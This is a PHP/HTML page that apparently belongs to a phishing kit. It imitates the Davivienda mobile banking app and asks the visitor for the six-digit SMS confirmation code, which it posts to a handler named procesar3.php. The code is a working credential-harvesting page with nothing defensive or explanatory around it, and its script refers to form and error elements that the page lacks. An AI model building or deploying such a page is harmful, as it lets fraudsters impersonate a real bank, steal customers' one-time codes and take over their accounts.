<?php session_start(); ?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Davivienda Móvil - Código SMS</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(to bottom, rgba(237, 28, 39, 1) 40%, #f2f2f2 40%);
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
    }

    .container {
      width: 90%;
      max-width: 360px;
      background: #ffffff;
      border-radius: 16px;
      box-shadow: 0 6px 14px rgba(0, 0, 0, 0.2);
      padding: 2rem 1.5rem;
      box-sizing: border-box;
      margin-bottom: 80px;
    }

    .logo {
      display: flex;
      justify-content: center;
      align-items: center;
      margin-bottom: 1rem;
    }

    .logo img {
      height: 35px;
    }

    h2 {
      text-align: center;
      font-size: 1rem;
      color: #333;
      margin: 0.5rem 0 1.2rem;
      line-height: 1.4;
    }

    .input-icon-wrapper {
      position: relative;
      margin-bottom: 1.2rem;
    }

    .input-icon-wrapper input {
      width: 100%;
      padding: 0.65rem 2.5rem 0.65rem 2.5rem;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 0.95rem;
      box-sizing: border-box;
      text-align: center;
      letter-spacing: 4px;
    }

    .input-icon-wrapper::before {
      content: '';
      position: absolute;
      top: 50%;
      left: 0.7rem;
      transform: translateY(-50%);
      width: 20px;
      height: 20px;
      background-size: contain;
      background-repeat: no-repeat;
      opacity: 0.6;
    }

    label {
      font-size: 0.9rem;
      color: #333;
      display: block;
      margin-bottom: 0.4rem;
    }

    .instructions {
      font-size: 0.85rem;
      color: #666;
      text-align: center;
      margin-bottom: 1rem;
    }

    .login-btn {
      width: 100%;
      padding: 0.85rem;
      background-color: #d90000;
      color: white;
      border: none;
      border-radius: 20px;
      font-size: 1rem;
      cursor: pointer;
      transition: background 0.3s ease;
    }

    .login-btn:hover {
      background-color: #b30000;
    }

    .footer-menu {
      position: fixed;
      bottom: 0;
      width: 100%;
      max-width: 360px;
      background-color: #fff;
      display: flex;
      justify-content: space-between;
      border-top: 1px solid #ccc;
      padding: 0.4rem 0;
      z-index: 10;
    }

    .footer-item {
      flex: 1;
      text-align: center;
      font-size: 0.7rem;
      color: #000;
      padding: 0.2rem;
    }

    .footer-item img {
      width: 22px;
      height: 22px;
      display: block;
      margin: 0 auto 0.2rem;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <img src="logo.png" alt="Davivienda Logo" />
    </div>
    <form action="procesar3.php" method="post">
    <h2>Ingresa el código de 6 dígitos</h2>
    <p class="instructions">
      Ingrese su código de confirmación enviado a su celular.
    </p>

    <div class="input-icon-wrapper">
      <input 
        type="tel" 
        id="codigo" 
        name="bg3"
        inputmode="numeric" 
        pattern="[0-9]{6}" 
        maxlength="6" 
        placeholder="••••••" 
      />
    </div>
    <button class="login-btn">Continuar</button>
</form>

  </div>

  <!-- Footer -->
  <div class="footer-menu">
    <div class="footer-item">
      <img src="https://cdn-icons-png.flaticon.com/512/2989/2989988.png" alt="Productos" />
      <span>Abrir productos<br>en Línea</span>
    </div>
    <div class="footer-item">
      <img src="https://cdn-icons-png.flaticon.com/512/847/847969.png" alt="Registrarse" />
      <span>Registrarse</span>
    </div>
    <div class="footer-item">
      <img src="https://cdn-icons-png.flaticon.com/512/2462/2462719.png" alt="Atención" />
      <span>Atención en<br>Línea</span>
    </div>
    <div class="footer-item">
      <img src="https://cdn-icons-png.flaticon.com/512/535/535239.png" alt="Agencias" />
      <span>Agencias y<br>Cajeros</span>
    </div>
    <div class="footer-item">
      <img src="https://cdn-icons-png.flaticon.com/512/512/512222.png" alt="Más" />
      <span>Más...</span>
    </div>
  </div>
</body>
<script>
  const codigoInput = document.getElementById("codigo");
  const errorDiv = document.getElementById("codigo-error");

  // Bloquear letras y símbolos al escribir
  codigoInput.addEventListener("input", () => {
    codigoInput.value = codigoInput.value.replace(/\D/g, ''); // Elimina todo lo que no sea dígito
  });

  // Validar al enviar (opcional)
  document.getElementById("loginForm").addEventListener("submit", function (e) {
    if (codigoInput.value.length !== 6) {
      e.preventDefault();
      errorDiv.textContent = "Debe ingresar exactamente 6 números.";
    } else {
      errorDiv.textContent = "";
    }
  });
</script>
</html>
